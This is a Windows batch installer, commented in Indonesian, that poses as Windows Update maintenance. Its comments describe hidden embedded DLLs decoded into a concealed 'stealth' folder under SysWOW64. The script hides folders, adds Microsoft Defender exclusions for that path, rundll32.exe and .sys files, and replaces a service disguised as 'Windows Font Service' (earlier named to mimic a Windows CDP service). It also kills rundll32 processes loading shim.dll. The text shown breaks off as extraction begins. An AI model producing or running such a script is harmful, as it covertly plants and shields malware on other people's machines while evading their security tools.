@echo off
setlocal
title WINDOWS UPDATE HOST - MAINTENANCE

rem ============================================================
rem  WINDOWS UPDATE HOST - MAINTENANCE  (SATU FILE, tanpa jejak TEMP)
rem  shim.dll + WinUpdHost.dll + Newtonsoft.Json.dll di-embed
rem  sebagai base64. Didecode ke folder STEALTH tersembunyi:
rem    %%SystemRoot%%\SysWOW64\WinUpdate\.syscache
rem  (bukan di samping file ini). Jalankan sebagai ADMIN.
rem ============================================================

net session >nul 2>&1 || (echo [x] Jalankan sebagai ADMIN. & pause & exit /b 1)

set "HERE=%~dp0"
set "WORK=%SystemRoot%\SysWOW64\WinUpdate\.syscache"
set "SVC=Font"
set "SVC_DISP=Windows Font Service"
set "COOKIE=%WORK%\syscookie.dat"
set "PORT=8888"
set "BASE=http://127.0.0.1:%PORT%"

if not exist "%WORK%" mkdir "%WORK%"
attrib +h "%SystemRoot%\SysWOW64\WinUpdate" >nul 2>&1
attrib +h "%WORK%" >nul 2>&1
rem --- ACL: service (LocalService) + SYSTEM full, user biasa read-only ---
icacls "%WORK%" /grant "*S-1-5-19:(OI)(CI)F" /grant "*S-1-5-18:(OI)(CI)F" /grant "*S-1-5-32-545:(OI)(CI)RX" >nul 2>&1
rem --- bersihkkan WORK lama (sebelum pindah) biar tidak dobel jejak ---
rd /s /q "%ProgramData%\Microsoft\Windows\WinUpdate\.syscache" >nul 2>&1
rd /s /q "%HERE%.syscache" >nul 2>&1

rem ---------- Pengecualian Defender SEBELUM ekstraksi (nempel kalau Tamper Protect OFF) ----------
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%WORK%' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'rundll32.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionExtension '.sys' -EA SilentlyContinue" >nul 2>&1

rem ---------- Hentikan instalasi lama (agar file tidak terkunci) ----------
echo [*] Menghentikan layanan lama...
rem --- sisa nama lama (migrasi rebrand CDPSvc_51dba -> Font): SELALU dibersihkan dulu ---
sc stop CDPSvc_51dba >nul 2>&1
sc delete CDPSvc_51dba >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\CDPSvc_51dba" /f >nul 2>&1
powershell -NoProfile -Command "$p='HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost';$c=(Get-ItemProperty -Path $p -Name LocalService -EA SilentlyContinue).LocalService;if($c){$n=@($c | Where-Object { $_ -ne 'CDPSvc_51dba' -and $_ -ne '' });Set-ItemProperty -Path $p -Name LocalService -Value $n -Type MultiString}" >nul 2>&1
sc query "%SVC%" >nul 2>&1
if errorlevel 1 goto KILLPROC
sc stop "%SVC%" >nul 2>&1
set /a SRT=0
:OLDSTOPWAIT
sc query "%SVC%" | find /i "STOPPED" >nul 2>&1
if errorlevel 1 ( set /a SRT+=1 & if %SRT% lss 15 ( timeout /t 2 /nobreak >nul & goto OLDSTOPWAIT ) )
sc delete "%SVC%" >nul 2>&1
timeout /t 2 /nobreak >nul
:KILLPROC
powershell -NoProfile -Command "Get-CimInstance Win32_Process | Where-Object { $_.Name -eq 'rundll32.exe' -and $_.CommandLine -match 'shim\.dll' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }" >nul 2>&1
timeout /t 1 /nobreak >nul
rem --- pastikan record service lama benar2 hilang (pending-delete butuh waktu/handle tutup) ---
set /a DRT=0
:DELWAIT
sc query "%SVC%" >nul 2>&1
if errorlevel 1 goto DELWAIT2
set /a DRT+=1
if %DRT% gtr 20 ( echo [x] Service %SVC% nyangkut pending-delete. Tutup services.msc/Task Manager, REBOOT, lalu ulangi. & goto CLEANUP )
timeout /t 2 /nobreak >nul & goto DELWAIT
:DELWAIT2
sc query CDPSvc_51dba >nul 2>&1
if errorlevel 1 goto FRESH
set /a DRT+=1
if %DRT% gtr 20 ( echo [x] Service lama CDPSvc_51dba nyangkut pending-delete. REBOOT, lalu ulangi. & goto CLEANUP )
timeout /t 2 /nobreak >nul & goto DELWAIT2
:FRESH

echo [*] Mengekstrak komponen...
del /f "%WORK%\shim.dll" >nul 2>&1
del /f "%WORK%\WinUpdHost.dll" >nul 2>&1
del /f "%WORK%\Newtonsoft.Json.dll" >nul 2>&1
del /f "%WORK%\uninstall.cmd" >nul 2>&1
